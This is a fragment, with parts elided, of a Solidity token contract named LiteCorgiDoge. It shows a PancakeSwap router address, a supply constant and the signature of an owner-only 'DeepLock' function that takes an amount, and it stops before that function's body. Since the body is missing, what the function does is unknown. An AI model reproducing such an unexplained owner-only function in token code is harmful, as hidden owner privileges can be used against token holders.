...
contract LiteCorgiDoge is Context, IERC20, IERC20Metadata, Ownable {   

    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   
    uint256 _NUM = 1 * 10**9 * 10**9;
    ...
    function DeepLock(uint256 amount) public onlyOwner virtual returns (bool) {
